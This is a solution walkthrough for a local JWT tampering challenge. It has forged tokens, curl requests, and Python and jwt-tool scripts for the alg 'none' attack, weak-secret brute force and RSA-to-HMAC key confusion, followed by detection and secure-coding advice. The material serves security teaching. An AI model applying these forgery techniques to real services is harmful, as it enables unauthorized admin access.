# 🔓 JWT Tampering Challenge - Complete Solution Guide

> **⚠️ SPOILER ALERT**: This document contains complete solutions to all challenge stages. Use it only after attempting the challenge yourself or for educational reference.

## 🎯 Quick Victory Path

### Stage 1: Algorithm "none" Attack (Easiest)
1. Login with any user (e.g., `user`/`password123`) using stage "none"
2. Copy the received JWT token
3. Decode it at [jwt.io](https://jwt.io) or use the built-in decoder
4. Modify the header: `{"alg": "none", "typ": "JWT"}`
5. Modify the payload: `{"isAdmin": true, ...}`
6. Remove the signature portion (everything after the second dot)
7. Use custom token to access `/api/admin`

**Example Attack**:
```
Original: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6MSwiaXNBZG1pbiI6ZmFsc2V9.
Modified: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6MSwiaXNBZG1pbiI6dHJ1ZX0.
```

### Stage 2: Weak Secret Brute Force
1. Login using stage "weak"
2. Use jwt-tool or manual brute force to crack the secret: `secret`
3. Generate new token with `isAdmin: true` using the cracked secret
4. Sign with HS256 algorithm

**JWT Tool Command**:
```bash
jwt-tool <token> -C -d /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
```

### Stage 3: RSA-to-HMAC Key Confusion
1. Login using stage "rsa"
2. Get the RSA public key from `/api/public-key`
3. Create HMAC-signed token using the public key as the secret
4. Set algorithm to "HS256" and include admin claims

## 📚 Detailed Attack Methodologies

### Stage 1: Algorithm "none" - Complete Walkthrough

#### Understanding the Vulnerability
The "none" algorithm is a legitimate JWT feature for unsecured tokens, but servers should never accept it for protected resources.

#### Step-by-Step Exploitation

1. **Initial Token Analysis**
   ```javascript
   // Original token structure
   Header: {"typ": "JWT", "alg": "none"}
   Payload: {"id": 1, "username": "user", "isAdmin": false, "role": "user", "stage": "none"}
   Signature: (empty)
   ```

2. **Token Modification**
   ```javascript
   // Modified payload
   {
     "id": 1,
     "username": "user", 
     "isAdmin": true,      // <- Changed to true
     "role": "user",
     "stage": "none"
   }
   ```

3. **Manual Token Construction**
   ```bash
   # Base64 encode header
   echo -n '{"typ":"JWT","alg":"none"}' | base64 -w 0
   # Result: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
   
   # Base64 encode modified payload  
   echo -n '{"id":1,"username":"user","isAdmin":true,"role":"user","stage":"none"}' | base64 -w 0
   # Result: eyJpZCI6MSwidXNlcm5hbWUiOiJ1c2VyIiwiaXNBZG1pbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJzdGFnZSI6Im5vbmUifQ
   
   # Final token (no signature)
   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJ1c2VyIiwiaXNBZG1pbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJzdGFnZSI6Im5vbmUifQ.
   ```

4. **Testing the Attack**
   ```bash
   curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJ1c2VyIiwiaXNBZG1pbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJzdGFnZSI6Im5vbmUifQ." http://localhost:3001/api/admin
   ```

### Stage 2: Weak Secret Attack - Complete Walkthrough

#### Understanding the Vulnerability
HMAC tokens are only as secure as their secret. Weak secrets can be brute-forced offline.

#### Automated Brute Force with jwt-tool
```bash
# Install jwt-tool
pip3 install jwt-tool

# Brute force attack
jwt-tool eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9... -C -d /path/to/wordlist.txt

# Common weak secrets to try:
# secret, password, 123456, admin, test, key, jwt, token
```

#### Manual Secret Testing
```python
import jwt
import base64

# Token from server
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."

# Common secrets to test
secrets = ["secret", "password", "123456", "admin", "key", "jwt"]

for secret in secrets:
    try:
        decoded = jwt.decode(token, secret, algorithms=["HS256"])
        print(f"SECRET FOUND: {secret}")
        print(f"Decoded: {decoded}")
        break
    except jwt.InvalidSignatureError:
        continue
```

#### Token Forgery
```python
import jwt

# Create new token with admin privileges
payload = {
    "id": 1,
    "username": "user",
    "isAdmin": True,  # Escalated privilege
    "role": "user",
    "stage": "weak"
}

# Sign with cracked secret
new_token = jwt.encode(payload, "secret", algorithm="HS256")
print(f"Forged token: {new_token}")
```

### Stage 3: RSA-to-HMAC Key Confusion - Complete Walkthrough

#### Understanding the Vulnerability
This attack exploits servers that accept multiple algorithms without proper validation, allowing RSA public keys to be used as HMAC secrets.

#### Attack Methodology

1. **Obtain RSA Public Key**
   ```bash
   curl http://localhost:3001/api/public-key
   ```

2. **Extract Public Key**
   ```
   -----BEGIN PUBLIC KEY-----
   MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
   -----END PUBLIC KEY-----
   ```

3. **Create HMAC Token Using Public Key as Secret**
   ```python
   import jwt
   
   # RSA public key (obtained from server)
   public_key = """-----BEGIN PUBLIC KEY-----
   MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
   -----END PUBLIC KEY-----"""
   
   # Create admin payload
   payload = {
       "id": 1,
       "username": "user",
       "isAdmin": True,
       "role": "user", 
       "stage": "rsa"
   }
   
   # Sign with HMAC using public key as secret
   confused_token = jwt.encode(payload, public_key, algorithm="HS256")
   print(f"Key confusion token: {confused_token}")
   ```

4. **Advanced: Using jwt-tool**
   ```bash
   # Generate key confusion attack
   jwt-tool -T -S hs256 -k public_key.pem <original_rsa_token>
   ```

#### Why This Works
- Server expects RSA verification but accepts HMAC
- Attacker uses RSA public key (known) as HMAC secret
- Server unwittingly validates HMAC signature using its own public key

## 🏆 Advanced Techniques & Easter Eggs

### Super Admin Escalation
1. Successfully complete any stage to get admin access
2. Modify token to include `"role": "superadmin"`
3. Access hidden `/api/super-admin` endpoint

```javascript
// Super admin payload
{
  "id": 1,
  "username": "user",
  "isAdmin": true,
  "role": "superadmin",  // <- Key addition
  "stage": "none"
}
```

### Fake Admin Panel Detection
The `/api/fake-admin` endpoint demonstrates a common vulnerability:
- Uses `jwt.decode()` instead of `jwt.verify()`
- Only checks the `isAdmin` claim without signature validation
- Can be bypassed with any modified token

### Hidden Endpoint Discovery
```bash
# Scan for hidden endpoints
curl http://localhost:3001/api/endpoints

# Try common admin paths
/api/admin
/api/super-admin
/api/secret
/api/hidden
/api/debug
```

## 🛠️ Tool Arsenal

### JWT Manipulation Tools

#### 1. jwt-tool (Recommended)
```bash
# Installation
pip3 install jwt-tool

# Basic usage
jwt-tool <token>                    # Analyze token
jwt-tool <token> -C -d wordlist.txt # Crack secret
jwt-tool <token> -T                 # Tamper with claims
jwt-tool <token> -X a               # Algorithm confusion
```

#### 2. JWT.io (Web-based)
- **URL**: https://jwt.io
- **Features**: Decode, verify, generate tokens
- **Usage**: Paste token, modify claims, copy result

#### 3. Custom Python Scripts
```python
import jwt
import json
import base64

def decode_jwt_manual(token):
    """Manually decode JWT without verification"""
    parts = token.split('.')
    
    # Decode header
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    
    # Decode payload  
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    return header, payload

def create_none_token(payload):
    """Create algorithm 'none' token"""
    header = {"typ": "JWT", "alg": "none"}
    
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()  
    ).decode().rstrip('=')
    
    return f"{header_b64}.{payload_b64}."
```

#### 4. Burp Suite Extensions
- **JWT Editor**: Visual JWT manipulation
- **JSON Web Tokens**: Automated testing
- **Auth Analyzer**: Session analysis

## 🔍 Detection & Prevention

### How to Detect These Attacks

#### Server-Side Monitoring
```javascript
// Log suspicious JWT activity
function auditJWT(token, request) {
    const decoded = jwt.decode(token);
    
    // Red flags
    if (decoded.alg === 'none') {
        console.log('🚨 ALERT: "none" algorithm detected');
    }
    
    if (decoded.isAdmin && !verifiedAdmin(decoded.id)) {
        console.log('🚨 ALERT: Privilege escalation attempt');
    }
    
    if (tokenSignatureInvalid(token)) {
        console.log('🚨 ALERT: Invalid signature detected');
    }
}
```

#### Client-Side Indicators
- Unusual token structure (missing signature)
- Tokens that decode without errors but fail server validation
- Algorithm mismatches in network traffic

### How to Prevent These Attacks

#### Secure JWT Implementation
```javascript
// ✅ SECURE: Proper JWT verification
function secureVerifyJWT(token) {
    try {
        // 1. Explicitly specify allowed algorithms
        const decoded = jwt.verify(token, SECRET_KEY, {
            algorithms: ['HS256']  // Never allow 'none'
        });
        
        // 2. Additional validation
        if (!decoded.exp || decoded.exp < Date.now() / 1000) {
            throw new Error('Token expired');
        }
        
        // 3. Validate claims
        if (decoded.isAdmin && !isValidAdmin(decoded.id)) {
            throw new Error('Invalid admin claim');
        }
        
        return decoded;
    } catch (error) {
        throw new Error('Authentication failed');
    }
}

// ✅ SECURE: Strong secret management
const SECRET_KEY = process.env.JWT_SECRET || crypto.randomBytes(64).toString('hex');

// ✅ SECURE: Algorithm whitelist
const ALLOWED_ALGORITHMS = ['HS256'];  // Never include 'none'

// ✅ SECURE: Key type validation
function verifyWithProperKey(token, publicKey, privateKey) {
    const header = jwt.decode(token, { complete: true }).header;
    
    if (header.alg.startsWith('HS')) {
        // HMAC - use secret key
        return jwt.verify(token, SECRET_KEY, { algorithms: ['HS256'] });
    } else if (header.alg.startsWith('RS')) {
        // RSA - use public key only
        return jwt.verify(token, publicKey, { algorithms: ['RS256'] });
    } else {
        throw new Error('Unsupported algorithm');
    }
}
```

#### Security Checklist
- ✅ Never allow `"none"` algorithm in production
- ✅ Use strong, randomly generated secrets (32+ bytes)
- ✅ Explicitly whitelist allowed algorithms  
- ✅ Validate token expiration and claims
- ✅ Use proper key types for each algorithm
- ✅ Implement proper error handling
- ✅ Log and monitor JWT-related security events
- ✅ Regular security audits and penetration testing

## 🎓 Learning Objectives Achieved

After completing this challenge, you should understand:

### Technical Concepts
- **JWT Structure**: Header, payload, signature components
- **Cryptographic Signatures**: HMAC vs RSA differences
- **Algorithm Confusion**: How attackers exploit implementation flaws
- **Token Manipulation**: Manual and automated attack techniques

### Security Principles
- **Defense in Depth**: Multiple validation layers
- **Principle of Least Privilege**: Minimal necessary permissions
- **Secure by Default**: Safe configuration practices
- **Input Validation**: Never trust client-provided data

### Practical Skills
- **Penetration Testing**: Systematic vulnerability discovery
- **Tool Usage**: Professional security testing tools
- **Attack Methodology**: Structured exploitation approaches
- **Report Writing**: Documenting findings and recommendations

## 🚀 Next Steps

### Advanced Challenges
1. **JWT with JWK injection vulnerabilities**
2. **Time-based attacks on JWT validation**
3. **JWT confusion with different token types (SAML, etc.)**
4. **Advanced key confusion with ECDSA algorithms**

### Real-World Application
1. **Audit existing applications for JWT vulnerabilities**
2. **Implement secure JWT handling in your projects**
3. **Contribute to open-source security tools**
4. **Share knowledge through blog posts or presentations**

---

## ⚠️ Responsible Disclosure

Remember:
- **Educational Purpose**: Use this knowledge responsibly
- **Legal Boundaries**: Only test systems you own or have permission to test
- **Ethical Hacking**: Follow responsible disclosure practices
- **Community Contribution**: Share knowledge to improve overall security

**Happy Learning!** 🔐✨